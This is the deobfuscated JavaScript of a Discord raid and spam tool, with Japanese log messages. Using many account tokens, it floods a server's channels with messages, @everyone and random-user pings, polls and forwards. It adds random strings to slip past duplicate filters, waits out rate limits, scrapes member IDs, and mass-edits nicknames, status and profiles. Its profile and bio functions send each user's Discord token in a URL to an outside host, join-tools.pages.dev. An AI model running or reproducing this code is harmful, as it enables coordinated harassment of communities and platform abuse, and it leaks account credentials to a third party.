// Discord Message Spammer Tool - Deobfuscated Version
// WARNING: This code appears to be for automated Discord messaging/spamming
// Use responsibly and in compliance with Discord's Terms of Service

// Global variables and constants
const logEl = document.getElementById('log');
const x_super_properties = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tIiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM4NDg4NywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=';

let shouldStopSpam = false;

// UI Elements
const tokensInput = document.getElementById('tokens');
const guildInput = document.getElementById('guildId');
const channelInput = document.getElementById('channelIds');
const messageInput = document.getElementById('message');
const randomizeCheckbox = document.getElementById('randomize');
const randomStringCheckbox = document.getElementById('randomString');
const randomStringLengthInput = document.getElementById('randomStringLength');
const randomStringSettings = document.getElementById('randomStringSettings');
const delayInput = document.getElementById('delay');
const limitInput = document.getElementById('limit');
const mentionInput = document.getElementById('mentionIds');
const pollTitleInput = document.getElementById('pollTitle');
const pollAnswersInput = document.getElementById('pollAnswers');
const forwardUrlInput = document.getElementById('forwardMessageUrl');
const autoFillBtn = document.getElementById('autoFillChannels');
const fetchMentionsBtn = document.getElementById('fetchMentions');
const submitBtn = document.getElementById('submitBtn');
const stopBtn = document.getElementById('stopSpam');
const leaveBtn = document.getElementById('leaveBtn');
const newNicknameInput = document.getElementById('newNickname');
const changeNicknameBtn = document.getElementById('changeNicknameBtn');
const onlineStatusSelect = document.getElementById('onlineStatus');
const activityTypeSelect = document.getElementById('activityType');
const activityNameInput = document.getElementById('activityName');
const changeStatusBtn = document.getElementById('changeStatusBtn');
const clearStatusBtn = document.getElementById('clearStatusBtn');
const profileImageFileInput = document.getElementById('profileImageFile');
const imagePreview = document.getElementById('imagePreview');
const previewImg = document.getElementById('previewImg');
const clearImageBtn = document.getElementById('clearImageBtn');
const globalNameInput = document.getElementById('globalName');
const profileBioInput = document.getElementById('profileBio');
const changeProfileBtn = document.getElementById('changeProfileBtn');
const changeBioBtn = document.getElementById('changeBioBtn');
const form = document.getElementById('form');

// Utility Functions
function appendLog(message) {
    const timestamp = new Date().toLocaleTimeString();
    logEl.textContent += '\n' + timestamp + ' - ' + message;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() {
    logEl.textContent = '';
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function parseList(input) {
    const items = input.split(/[\s,]+/).map(item => item.trim()).filter(item => item);
    return [...new Set(items)]; // Remove duplicates
}

// Generate random string with specified length using a-z, A-Z, 0-9
function generateRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

let selectedImageBase64 = null;

function fileToBase64(file) {
    return new Promise((resolve, reject) => {
        if (file.size > 8 * 1024 * 1024) {
            reject(new Error('ファイルサイズが8MBを超えています'));
            return;
        }
        
        const reader = new FileReader();
        reader.onload = () => {
            const result = reader.result;
            resolve(result);
        };
        reader.onerror = () => {
            reject(new Error('ファイル読み込みエラー'));
        };
        reader.readAsDataURL(file);
    });
}

function parseMessageUrl(url) {
    if (!url) return null;
    const match = url.match(/https:\/\/discord\.com\/channels\/(\d+)\/(\d+)\/(\d+)/);
    if (!match) return null;
    return {
        'guildId': match[1],
        'channelId': match[2],
        'messageId': match[3]
    };
}

// Discord API Functions
async function leaveGuild(token, guildId) {
    const response = await fetch('https://discord.com/api/v9/users/@me/guilds/' + guildId, {
        'method': 'DELETE',
        'headers': {
            'Authorization': token,
            'Content-Type': 'application/json',
            'x-super-properties': x_super_properties
        },
        'body': JSON.stringify({'lurking': false}),
        'referrerPolicy': 'no-referrer'
    });

    if (response.status === 204) {
        appendLog('✅ 退出成功: ' + token.slice(0, 10) + '*****');
    } else {
        appendLog('❌ ' + token.slice(0, 10) + '*****　- 退出失敗(' + JSON.stringify(await response.json()) + ')');
    }
}

async function sendMessage(token, channelId, content, options = {}) {
    const headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'x-super-properties': x_super_properties
    };

    let payload = {'content': content || ''};

    // Add randomization if enabled
    if (options.randomize) {
        payload.content += '\n' + crypto.randomUUID();
    }

    // Add random string if enabled
    if (options.useRandomString) {
        const randomStr = generateRandomString(options.randomStringLength || 5);
        payload.content += ' ' + randomStr;
    }

    // Add @everyone mention if enabled
    if (options.allmention) {
        payload.content = '@everyone\n' + payload.content;
    }

    // Add random user mention if available
    if (options.randomMentions) {
        const randomUser = options.randomMentions[Math.floor(Math.random() * options.randomMentions.length)];
        payload.content = '<@' + randomUser + '>\n' + payload.content;
    }

    // Add poll if specified
    if (options.pollTitle && options.pollAnswers) {
        payload.poll = {
            'question': {'text': options.pollTitle},
            'answers': options.pollAnswers.map(answer => ({'poll_media': {'text': answer.trim()}})),
            'allow_multiselect': false,
            'duration': 1,
            'layout_type': 1
        };
    }

    const response = await fetch('https://discord.com/api/v9/channels/' + channelId + '/messages', {
        'method': 'POST',
        'headers': headers,
        'body': JSON.stringify(payload),
        'referrerPolicy': 'no-referrer'
    });

    return response;
}

async function forwardMessage(token, channelId, messageData) {
    const headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'x-super-properties': x_super_properties
    };

    let payload = {
        'mobile_network_type': 'unknown',
        'content': '',
        'tts': false,
        'message_reference': {
            'guild_id': messageData.guildId,
            'channel_id': messageData.channelId,
            'message_id': messageData.messageId,
            'type': 1
        },
        'flags': 0
    };

    const response = await fetch('https://discord.com/api/v9/channels/' + channelId + '/messages', {
        'method': 'POST',
        'headers': headers,
        'body': JSON.stringify(payload),
        'referrerPolicy': 'no-referrer'
    });

    return response;
}

async function authenticateOnly(token) {
    return new Promise(resolve => {
        const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
        
        ws.onopen = () => {
            ws.send(JSON.stringify({
                'op': 2,
                'd': {
                    'token': token,
                    'properties': {
                        'os': 'Windows',
                        'browser': 'Discord',
                        'device': 'pc'
                    },
                    'intents': 0
                }
            }));
        };

        ws.onmessage = event => {
            const data = JSON.parse(event.data);
            if (data.t === 'READY') {
                appendLog('✅ 認証完了: ' + token.slice(0, 10) + '*****');
                ws.close();
                resolve(true);
            } else if (data.t === 'INVALID_SESSION') {
                appendLog('❌ 認証失敗: ' + token.slice(0, 10) + '*****');
                ws.close();
                resolve(false);
            }
        };

        ws.onerror = () => {
            appendLog('❌ WebSocket エラー: ' + token.slice(0, 10) + '*****');
            ws.close();
            resolve(false);
        };

        ws.onclose = () => {
            resolve(false);
        };
    });
}

// Retry Functions
async function sendMessageWithRetry(token, channelId, content, options = {}, maxRetries = 5, retryDelay = 3000) {
    let retries = 0;
    
    while (retries < maxRetries) {
        try {
            const response = await sendMessage(token, channelId, content, options);
            
            if (response.ok) {
                appendLog('✅ ' + token.slice(0, 10) + '***** - メッセージ送信成功');
                return true;
            } else if (response.status === 429) {
                // Rate limited
                const rateLimitData = await response.json();
                const waitTime = (rateLimitData?.retry_after || 1) * 1000;
                appendLog('⚠️ ' + token.slice(0, 10) + '***** - レート制限: ' + waitTime / 1000 + 's');
                await sleep(waitTime);
            } else if (response.status === 400) {
                // Bad request - check auth
                const errorData = await response.json();
                appendLog('❌ ' + token.slice(0, 10) + '***** - 送信エラー(' + response.status + '): ' + 
                    (JSON.stringify(errorData) || '詳細不明'));
                
                const authTest = await authenticateOnly(token);
                if (!authTest) return false;
            } else {
                const errorData = await response.json();
                appendLog('❌ ' + token.slice(0, 10) + '***** - 送信エラー(' + response.status + 
                    '): ' + (JSON.stringify(errorData) || '詳細不明'));
                return false;
            }
        } catch (error) {
            appendLog('⚠️ ' + token.slice(0, 10) + '***** - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            retries++;
        }
    }

    appendLog('❌ トークン(' + token.slice(0, 10) + ') 最大リトライ回数に達しました');
    return false;
}

async function forwardMessageWithRetry(token, channelId, messageData, maxRetries = 5, retryDelay = 3000) {
    let retries = 0;
    
    while (retries < maxRetries) {
        try {
            const response = await forwardMessage(token, channelId, messageData);
            
            if (response.ok) {
                appendLog('✅ ' + token.slice(0, 10) + '***** - メッセージ転送成功');
                return true;
            } else if (response.status === 429) {
                // Rate limited
                const rateLimitData = await response.json();
                const waitTime = (rateLimitData?.retry_after || 1) * 1000;
                appendLog('⚠️ ' + token.slice(0, 10) + '***** - レート制限: ' + waitTime / 1000 + 's');
                await sleep(waitTime);
            } else if (response.status === 400) {
                // Bad request - check auth
                const errorData = await response.json();
                appendLog('❌ ' + token.slice(0, 10) + '***** - 転送エラー(' + response.status + 
                    '): ' + (JSON.stringify(errorData) || '詳細不明'));
                
                const authTest = await authenticateOnly(token);
                if (!authTest) return false;
            } else {
                const errorData = await response.json();
                appendLog('❌ ' + token.slice(0, 10) + '***** - 転送エラー(' + response.status + 
                    '): ' + (JSON.stringify(errorData) || '詳細不明'));
                return false;
            }
        } catch (error) {
            appendLog('⚠️ ' + token.slice(0, 10) + '***** - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            retries++;
        }
    }

    appendLog('❌ トークン(' + token.slice(0, 10) + ') 最大リトライ回数に達しました');
    return false;
}

// Change nickname function
async function changeNickname(token, guildId, nickname) {
    const headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'x-super-properties': x_super_properties
    };

    const payload = {
        'nick': nickname
    };

    try {
        const response = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members/@me`, {
            'method': 'PATCH',
            'headers': headers,
            'body': JSON.stringify(payload),
            'referrerPolicy': 'no-referrer'
        });

        return response;
    } catch (error) {
        throw new Error('ニックネーム変更に失敗しました: ' + error.message);
    }
}

async function changeNicknameWithRetry(token, guildId, nickname, maxRetries = 5, retryDelay = 3000) {
    let retries = 0;
    
    while (retries < maxRetries) {
        try {
            const response = await changeNickname(token, guildId, nickname);
            
            if (response.ok) {
                appendLog('✅ ' + token.slice(0, 10) + '***** - ニックネーム変更成功: ' + (nickname || '(リセット)'));
                return true;
            } else if (response.status === 429) {
                // Rate limited
                const rateLimitData = await response.json();
                const waitTime = (rateLimitData?.retry_after || 1) * 1000;
                appendLog('⚠️ ' + token.slice(0, 10) + '***** - レート制限: ' + waitTime / 1000 + 's');
                await sleep(waitTime);
            } else if (response.status === 403) {
                appendLog('❌ ' + token.slice(0, 10) + '***** - 権限不足');
                return false;
            } else if (response.status === 400) {
                const errorData = await response.json();
                appendLog('❌ ' + token.slice(0, 10) + '***** - 無効なリクエスト: ' + (errorData?.message || 'Unknown error'));
                return false;
            } else {
                appendLog('❌ ' + token.slice(0, 10) + '***** - ニックネーム変更失敗: ' + response.status);
                return false;
            }
        } catch (error) {
            appendLog('⚠️ ' + token.slice(0, 10) + '***** - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            retries++;
        }
    }

    appendLog('❌ トークン(' + token.slice(0, 10) + ') 最大リトライ回数に達しました');
    return false;
}

async function changeStatus(token, status, activityType, activityName) {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
        let heartbeatInterval;
        
        ws.onopen = () => {
            ws.send(JSON.stringify({
                op: 2,
                d: {
                    token: token,
                    properties: {
                        os: 'Windows',
                        browser: 'Discord',
                        device: 'pc'
                    },
                    intents: 0
                }
            }));
        };
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            
            if (data.op === 10) {
                heartbeatInterval = setInterval(() => {
                    ws.send(JSON.stringify({ op: 1, d: null }));
                }, data.d.heartbeat_interval);
            }
            
            if (data.t === 'READY') {
                const presence = {
                    op: 3,
                    d: {
                        status: status,
                        since: status === 'idle' ? Date.now() : null,
                        activities: [],
                        afk: status === 'idle'
                    }
                };
                
                if (activityType !== '' && activityName) {
                    presence.d.activities = [{
                        name: activityName,
                        type: parseInt(activityType)
                    }];
                }
                
                ws.send(JSON.stringify(presence));
                
                setTimeout(() => {
                    if (heartbeatInterval) clearInterval(heartbeatInterval);
                    ws.close();
                    resolve(true);
                }, 3000);
            }
        };
        
        ws.onerror = (error) => {
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            reject(error);
        };
        
        ws.onclose = () => {
            if (heartbeatInterval) clearInterval(heartbeatInterval);
        };
        
        // Timeout after 10 seconds
        setTimeout(() => {
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            if (ws.readyState === WebSocket.OPEN) {
                ws.close();
            }
            reject(new Error('タイムアウト'));
        }, 15000);
    });
}

async function changeStatusWithRetry(token, status, activityType, activityName, maxRetries = 3, retryDelay = 2000) {
    let retries = 0;
    
    while (retries < maxRetries) {
        try {
            await changeStatus(token, status, activityType, activityName);
            
            const statusText = {
                'online': 'オンライン',
                'idle': '離席中', 
                'dnd': '取り込み中',
                'invisible': 'オフライン'
            }[status];
            
            const activityText = activityType !== '' && activityName ? 
                ` | ${activityName}` : '';
            
            appendLog('✅ ' + token.slice(0, 10) + '***** - ステータス変更成功: ' + statusText + activityText);
            return true;
        } catch (error) {
            appendLog('⚠️ ' + token.slice(0, 10) + '***** - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            retries++;
        }
    }
    
    appendLog('❌ トークン(' + token.slice(0, 10) + ') ステータス変更失敗');
    return false;
}

async function clearStatus(token) {
    return changeStatus(token, 'online', '', '');
}

async function clearStatusWithRetry(token, maxRetries = 3, retryDelay = 2000) {
    let retries = 0;
    
    while (retries < maxRetries) {
        try {
            await clearStatus(token);
            appendLog('✅ ' + token.slice(0, 10) + '***** - ステータス削除成功: オンライン状態にリセット');
            return true;
        } catch (error) {
            appendLog('⚠️ ' + token.slice(0, 10) + '***** - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            retries++;
        }
    }
    
    appendLog('❌ トークン(' + token.slice(0, 10) + ') ステータス削除失敗');
    return false;
}

async function changeProfile(token, globalName, avatarBase64) {
    const url = `https://join-tools.pages.dev/profile?token=${encodeURIComponent(token)}&action=profile`;
    
    const payload = {};
    if (globalName) payload.global_name = globalName;
    if (avatarBase64) payload.avatar = avatarBase64;
    
    if (Object.keys(payload).length === 0) {
        throw new Error('グローバルネームまたはプロフィール画像が必要です');
    }
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
    
    return response;
}

async function changeProfileWithRetry(token, globalName, avatarBase64, maxRetries = 3, retryDelay = 2000) {
    let retries = 0;
    
    while (retries < maxRetries) {
        try {
            const response = await changeProfile(token, globalName, avatarBase64);
            const data = await response.json().catch(() => ({}));
            
            if (response.ok) {
                const changes = [];
                if (globalName) changes.push(`グローバルネーム: ${globalName}`);
                if (avatarBase64) changes.push('プロフィール画像更新');
                
                appendLog('✅ ' + token.slice(0, 10) + '***** - プロフィール変更成功: ' + changes.join(', '));
                return true;
            } else {
                appendLog('❌ ' + token.slice(0, 10) + '***** - プロフィール変更失敗: ' + (data.error || response.status));
                return false;
            }
        } catch (error) {
            appendLog('⚠️ ' + token.slice(0, 10) + '***** - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            retries++;
        }
    }
    
    appendLog('❌ トークン(' + token.slice(0, 10) + ') プロフィール変更失敗');
    return false;
}

async function changeBio(token, bio) {
    const url = `https://join-tools.pages.dev/profile?token=${encodeURIComponent(token)}&action=bio`;
    
    const payload = {
        bio: bio || ''
    };
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
    
    return response;
}

async function changeBioWithRetry(token, bio, maxRetries = 3, retryDelay = 2000) {
    let retries = 0;
    
    while (retries < maxRetries) {
        try {
            const response = await changeBio(token, bio);
            const data = await response.json().catch(() => ({}));
            
            if (response.ok) {
                appendLog('✅ ' + token.slice(0, 10) + '***** - Bio変更成功: ' + (bio || '(削除)'));
                return true;
            } else {
                appendLog('❌ ' + token.slice(0, 10) + '***** - Bio変更失敗: ' + (data.error || response.status));
                return false;
            }
        } catch (error) {
            appendLog('⚠️ ' + token.slice(0, 10) + '***** - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            retries++;
        }
    }
    
    appendLog('❌ トークン(' + token.slice(0, 10) + ') Bio変更失敗');
    return false;
}

// Form Validation
function checkFormValidity() {
    const tokens = tokensInput.value.trim();
    const guildId = guildInput.value.trim();
    const message = messageInput.value.trim();
    const forwardUrl = forwardUrlInput.value.trim();
    
    submitBtn.disabled = !(tokens && guildId && (message || forwardUrl));
}

// Event Listeners
tokensInput.addEventListener('input', checkFormValidity);
guildInput.addEventListener('input', checkFormValidity);
messageInput.addEventListener('input', checkFormValidity);
forwardUrlInput.addEventListener('input', checkFormValidity);

// Random string toggle
randomStringCheckbox.addEventListener('change', () => {
    randomStringSettings.style.display = randomStringCheckbox.checked ? 'flex' : 'none';
});

checkFormValidity();

profileImageFileInput.addEventListener('change', async (event) => {
    const file = event.target.files[0];
    if (!file) {
        selectedImageBase64 = null;
        imagePreview.style.display = 'none';
        return;
    }
    
    if (!file.type.startsWith('image/')) {
        alert('画像ファイルを選択してください');
        event.target.value = '';
        return;
    }
    
    try {
        selectedImageBase64 = await fileToBase64(file);
        previewImg.src = selectedImageBase64;
        imagePreview.style.display = 'block';
    } catch (error) {
        alert('画像の読み込みに失敗しました: ' + error.message);
        event.target.value = '';
        selectedImageBase64 = null;
        imagePreview.style.display = 'none';
    }
});

clearImageBtn.addEventListener('click', () => {
    profileImageFileInput.value = '';
    selectedImageBase64 = null;
    imagePreview.style.display = 'none';
});

// Auto-fill channels button
autoFillBtn.addEventListener('click', async () => {
    clearLog();
    
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    if (!guildId) {
        return appendLog('⚠️ サーバーIDを入力してください');
    }
    
    try {
        const response = await fetch('https://discord.com/api/v9/guilds/' + guildId + '/channels', {
            'headers': {
                'Authorization': tokens[0],
                'Content-Type': 'application/json',
                'x-super-properties': x_super_properties
            },
            'referrerPolicy': 'no-referrer'
        });
        
        if (!response.ok) {
            throw new Error(JSON.stringify(await response.json()));
        }
        
        const channels = await response.json();
        const textChannels = channels.filter(channel => channel.type === 0).map(channel => channel.id);
        
        if (!textChannels.length) {
            return appendLog('チャンネルが見つかりません');
        }
        
        channelInput.value = textChannels.join(',');
        appendLog('✅ チャンネル取得完了');
    } catch (error) {
        appendLog('❌ ' + token.slice(0, 10) + '***** - エラー：' + error.message);
    }
});

// Fetch mentions button
fetchMentionsBtn.addEventListener('click', async () => {
    clearLog();
    
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    const channels = parseList(channelInput.value);
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    if (!guildId) {
        return appendLog('⚠️ サーバーIDを入力してください');
    }
    if (!channels.length) {
        return appendLog('⚠️ チャンネルIDを入力してください');
    }
    
    const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
    
    ws.onopen = () => {
        ws.send(JSON.stringify({
            'op': 2,
            'd': {
                'token': tokens[0],
                'properties': {
                    'os': 'Windows',
                    'browser': 'Discord',
                    'device': 'pc'
                },
                'intents': 1 << 12
            }
        }));
    };

    ws.onmessage = event => {
        const data = JSON.parse(event.data);
        
        if (data.op === 0 && data.t === 'READY') {
            ws.send(JSON.stringify({
                'op': 14,
                'd': {
                    'guild_id': guildId,
                    'typing': false,
                    'activities': false,
                    'threads': true,
                    'channels': {[channels[0]]: [[0, 0]]}
                }
            }));
        }

        if (data.t === 'GUILD_MEMBER_LIST_UPDATE') {
            const members = data.d.ops[0].items.filter(item => item.member).map(item => item.member.user.id);
            
            if (members.length) {
                mentionInput.value = members.join(',');
                appendLog('✅ メンション取得完了');
            } else {
                appendLog('メンションが見つかりません');
            }
            ws.close();
        }
    };

    ws.onerror = () => {
        appendLog('❌ WebSocketエラー');
        ws.close();
    };
});

// Main form submission
form.addEventListener('submit', async (event) => {
    event.preventDefault();
    
    const message = messageInput.value.trim();
    const forwardUrl = forwardUrlInput.value.trim();
    
    if (!message && !forwardUrl) {
        appendLog('⚠️ メッセージ内容または転送URLを入力してください');
        return;
    }
    
    // Disable submit button and show loading state
    submitBtn.disabled = true;
    submitBtn.classList.add('loading');
    submitBtn.textContent = '実行中...';
    shouldStopSpam = false;
    stopBtn.disabled = false;
    
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    const channels = parseList(channelInput.value);
    const randomize = randomizeCheckbox.checked;
    const useRandomString = randomStringCheckbox.checked;
    const randomStringLength = parseInt(randomStringLengthInput.value) || 5;
    const delay = parseFloat(delayInput.value) || 0;
    const limit = limitInput.value.trim() ? parseInt(limitInput.value) : Infinity;
    const mentions = mentionInput.value.trim() ? parseList(mentionInput.value) : null;
    const pollTitle = pollTitleInput.value.trim() || null;
    const pollAnswers = pollAnswersInput.value.trim() ? parseList(pollAnswersInput.value) : null;
    const messageData = parseMessageUrl(forwardUrl);
    const isForwarding = !!messageData;
    
    if (forwardUrl && !messageData) {
        appendLog('⚠️ 無効な転送URLです');
        submitBtn.disabled = false;
        submitBtn.classList.remove('loading');
        submitBtn.textContent = '実行';
        return;
    }
    
    let messagesSent = 0;
    const promises = [];
    
    // Forward message logic
    if (isForwarding) {
        const forwardPromises = tokens.map(token => {
            return async () => {
                let channelIndex = 0;
                while (!shouldStopSpam && messagesSent < limit) {
                    if (channelIndex >= channels.length) channelIndex = 0;
                    const channelId = channels[channelIndex];
                    channelIndex++;
                    
                    const success = await forwardMessageWithRetry(token, channelId, messageData);
                    if (success) {
                        messagesSent++;
                    } else {
                        break;
                    }
                    
                    if (messagesSent >= limit) {
                        appendLog('✅ 指定数に達しました（転送）');
                        break;
                    }
                    
                    if (delay) {
                        await sleep(delay * 1000);
                    }
                }
            };
        });
        promises.push(...forwardPromises);
    }
    
    // Send message logic
    if (message) {
        const messagePromises = tokens.map(token => {
            return async () => {
                let channelIndex = 0;
                while (!shouldStopSpam && messagesSent < limit) {
                    if (channelIndex >= channels.length) channelIndex = 0;
                    const channelId = channels[channelIndex];
                    channelIndex++;
                    
                    const success = await sendMessageWithRetry(token, channelId, message, {
                        'randomize': randomize,
                        'useRandomString': useRandomString,
                        'randomStringLength': randomStringLength,
                        'randomMentions': mentions,
                        'pollTitle': pollTitle,
                        'pollAnswers': pollAnswers
                    });
                    
                    if (success) {
                        messagesSent++;
                    } else {
                        break;
                    }
                    
                    if (messagesSent >= limit) {
                        appendLog('✅ 指定数に達しました（メッセージ）');
                        break;
                    }
                    
                    if (delay) {
                        await sleep(delay * 1000);
                    }
                }
            };
        });
        promises.push(...messagePromises);
    }
    

    await Promise.all(promises.map(promiseFn => promiseFn()));
    
    submitBtn.disabled = false;
    submitBtn.classList.remove('loading');
    stopBtn.disabled = true;
    submitBtn.textContent = '実行';
    appendLog('✅ 完了');
});

stopBtn.addEventListener('click', () => {
    shouldStopSpam = true;
    appendLog('🛑 スパムを停止します...');
    submitBtn.disabled = false;
    submitBtn.classList.remove('loading');
    submitBtn.textContent = '実行';
});

leaveBtn.addEventListener('click', async () => {
    shouldStopSpam = true;
    stopBtn.disabled = true;
    appendLog('🛑 スパムを停止します...');
    
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    if (!guildId) {
        return appendLog('⚠️ サーバーIDを入力してください');
    }
    
    for (const token of tokens) {
        await leaveGuild(token, guildId);
    }
    
    appendLog('✅ 退出処理完了');
    submitBtn.disabled = false;
    submitBtn.classList.remove('loading');
    submitBtn.textContent = '実行';
});

changeNicknameBtn.addEventListener('click', async () => {
    clearLog();
    
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    const newNickname = newNicknameInput.value.trim();
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    if (!guildId) {
        return appendLog('⚠️ サーバーIDを入力してください');
    }
    
    changeNicknameBtn.disabled = true;
    changeNicknameBtn.textContent = '変更中...';
    
    appendLog(`ニックネーム変更開始: "${newNickname || '(リセット)'}"`);
    
    const promises = tokens.map(token => 
        changeNicknameWithRetry(token, guildId, newNickname)
    );
    
    await Promise.all(promises);
    
    appendLog('✅ ニックネーム変更処理完了');
    

    changeNicknameBtn.disabled = false;
    changeNicknameBtn.textContent = 'ニックネーム変更';
});

changeStatusBtn.addEventListener('click', async () => {
    clearLog();
    
    const tokens = parseList(tokensInput.value);
    const status = onlineStatusSelect.value;
    const activityType = activityTypeSelect.value;
    const activityName = activityNameInput.value.trim();
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    
    // Validate activity
    if (activityType !== '' && !activityName) {
        return appendLog('⚠️ アクティビティタイプを選択した場合は、アクティビティ名も入力してください');
    }
    
    // Disable button during operation
    changeStatusBtn.disabled = true;
    changeStatusBtn.textContent = '変更中...';
    
    const statusText = {
        'online': 'オンライン',
        'idle': '離席中',
        'dnd': '取り込み中',
        'invisible': 'オフライン'
    }[status];
    
    const activityText = activityType !== '' && activityName ? ` | ${activityName}` : '';
    appendLog(`ステータス変更開始: ${statusText}${activityText}`);
    
    const promises = tokens.map(token => 
        changeStatusWithRetry(token, status, activityType, activityName)
    );
    
    await Promise.all(promises);
    
    appendLog('✅ ステータス変更処理完了');
    
    // Re-enable button
    changeStatusBtn.disabled = false;
    changeStatusBtn.textContent = 'ステータス変更';
});

clearStatusBtn.addEventListener('click', async () => {
    clearLog();
    
    const tokens = parseList(tokensInput.value);
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    
    clearStatusBtn.disabled = true;
    clearStatusBtn.textContent = '削除中...';
    
    appendLog('ステータス削除開始: オンライン状態にリセット');
    
    const promises = tokens.map(token => 
        clearStatusWithRetry(token)
    );
    
    await Promise.all(promises);
    
    appendLog('✅ ステータス削除処理完了');
    
    clearStatusBtn.disabled = false;
    clearStatusBtn.textContent = 'ステータス削除';
});

changeProfileBtn.addEventListener('click', async () => {
    clearLog();
    
    const tokens = parseList(tokensInput.value);
    const globalName = globalNameInput.value.trim();
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    
    if (!globalName && !selectedImageBase64) {
        return appendLog('⚠️ グローバルネームまたはプロフィール画像を選択してください');
    }
    
    changeProfileBtn.disabled = true;
    changeProfileBtn.textContent = '変更中...';
    
    const changes = [];
    if (globalName) changes.push(`グローバルネーム: ${globalName}`);
    if (selectedImageBase64) changes.push('プロフィール画像更新');
    
    appendLog(`プロフィール変更開始: ${changes.join(', ')}`);
    
    const promises = tokens.map(token => 
        changeProfileWithRetry(token, globalName, selectedImageBase64)
    );
    
    await Promise.all(promises);
    
    appendLog('✅ プロフィール変更処理完了');
    
    changeProfileBtn.disabled = false;
    changeProfileBtn.textContent = 'プロフィール変更';
});

changeBioBtn.addEventListener('click', async () => {
    clearLog();
    
    const tokens = parseList(tokensInput.value);
    const bio = profileBioInput.value.trim();
    
    if (!tokens.length) {
        return appendLog('⚠️ トークンを入力してください');
    }
    
    changeBioBtn.disabled = true;
    changeBioBtn.textContent = '変更中...';
    
    appendLog(`Bio変更開始: "${bio || '(削除)'}"`);
    
    const promises = tokens.map(token => 
        changeBioWithRetry(token, bio)
    );
    
    await Promise.all(promises);
    
    appendLog('✅ Bio変更処理完了');
    
    changeBioBtn.disabled = false;
    changeBioBtn.textContent = 'Bio変更';
});
